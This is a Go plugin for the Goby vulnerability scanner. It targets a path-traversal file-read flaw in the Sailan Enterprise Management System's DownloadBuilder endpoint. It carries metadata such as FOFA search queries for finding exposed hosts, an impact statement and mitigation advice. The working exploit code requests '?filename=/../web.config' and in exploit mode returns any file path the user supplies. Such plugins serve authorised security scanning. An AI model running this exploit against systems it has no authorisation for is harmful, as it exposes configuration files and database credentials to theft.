package exploits

import (
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Sailan Enterprise Management System DownloadBuilder File Reading Vulnerability",
    "Description": "<p>Sailan Enterprise Management System is a software system that provides comprehensive management solutions for enterprises. It can help enterprises achieve refined management, improve efficiency, and reduce costs. The system integrates various management functions, including but not limited to project management, financial management, procurement management, sales management, and report analysis, aiming to provide a one-stop management solution for enterprises. This system is guided by advanced management concepts, combined with the actual business processes of the enterprise, and improves the management level of the enterprise through information technology.</p>",
    "Product": "Sailan Enterprise Management System",
    "Homepage": "http://www.slmobile.cn/web/index.php",
    "DisclosureDate": "2024-07-16",
    "PostTime": "2024-07-17",
    "Author": "harsonyoung@qq.com",
    "FofaQuery": "(body=\"企业管理系统\" && body=\"赛蓝\") || body=\"www.cailsoft.com\" ",
    "GobyQuery": "(body=\"企业管理系统\" && body=\"赛蓝\") || body=\"www.cailsoft.com\" ",
    "Level": "1",
    "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.slmobile.cn/web/index.php\">http://www.slmobile.cn/web/index.php</a></p><p> 2. Set access policies and whitelist access through security devices such as firewalls. </p><p> 3. If not necessary, prohibit public network access to the system. </p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "web.config,Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "/../web.config",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6",
    "Translation": {
        "CN": {
            "Name": "赛蓝企业管理系统 DownloadBuilder 文件读取漏洞",
            "Product": " 赛蓝企业管理系统",
            "Description": "<p>&nbsp; &nbsp; 赛蓝企业管理系统是一款为企业提供全面管理解决方案的软件系统，它能够帮助企业实现精细化管理，提高效率，降低成本。系统集成了多种管理功能，包括但不限于项目管理、财务管理、采购管理、销售管理以及报表分析等，旨在为企业提供一站式的管理解决方案。该系统以先进的管理思想为引导，结合企业实际业务流程，通过信息化手段提升企业管理水平。&nbsp;<br></p>",
            "Recommendation": "<p>1、官⽅暂未修复该漏洞，请⽤户联系⼚商修复漏洞：<a href=\"http://www.slmobile.cn/web/index.php\">http://www.slmobile.cn/web/index.php</a>&nbsp;</p><p>&nbsp;2、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。&nbsp;</p><p>3、如⾮必要，禁⽌公⽹访问该系统。<br></p>",
            "Impact": "<p>攻击者可通过该漏洞读取系统重要⽂件（如数据库配置⽂件、系统配置⽂件）、数据库配置⽂件等等，导致⽹站处于极度不安全状态。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Sailan Enterprise Management System DownloadBuilder File Reading Vulnerability",
            "Product": "Sailan Enterprise Management System",
            "Description": "<p>Sailan Enterprise Management System is a software system that provides comprehensive management solutions for enterprises. It can help enterprises achieve refined management, improve efficiency, and reduce costs. The system integrates various management functions, including but not limited to project management, financial management, procurement management, sales management, and report analysis, aiming to provide a one-stop management solution for enterprises. This system is guided by advanced management concepts, combined with the actual business processes of the enterprise, and improves the management level of the enterprise through information technology.<br></p>",
            "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update:<a href=\"http://www.slmobile.cn/web/index.php\">http://www.slmobile.cn/web/index.php</a></p><p>&nbsp;2. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>&nbsp;3. If not necessary, prohibit public network access to the system.&nbsp;<br></p>",
            "Impact": "<p>Attackers can use this vulnerability to read importantsystem files (such as database configuration files, systemconfiguration files), database configuration files, etc.,resulting in an extremely insecure state of the website.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10972"
}`

	postOrGet_Vtt4M6W7 := func(hostInfo *httpclient.FixUrl, filePath string) (string, error) {
		respTxt := ""
		getRequestConfig := httpclient.NewGetRequestConfig("/BaseModule/ReportManage/DownloadBuilder?filename=" + filePath)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		//请求
		response, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		
		if err != nil || response == nil{
			return "", err
		}
		respTxt = response.RawBody
		// 注意：返回值为（最终要返回的读取结果，错误）
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/BaseModule/ReportManage/DownloadBuilder?filename=/../web.config"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/../web.config": "xml",
			}
			// 函数继承
			fileReadFunc := postOrGet_Vtt4M6W7

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for filePath, fileText := range defaultModeMap {
				resp, err := fileReadFunc(u, filePath)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])
			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"web.config": {"/../web.config", "xml"},
			}
			// 此处需要修改：函数继承
			fileReadFunc := postOrGet_Vtt4M6W7

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := fileReadFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
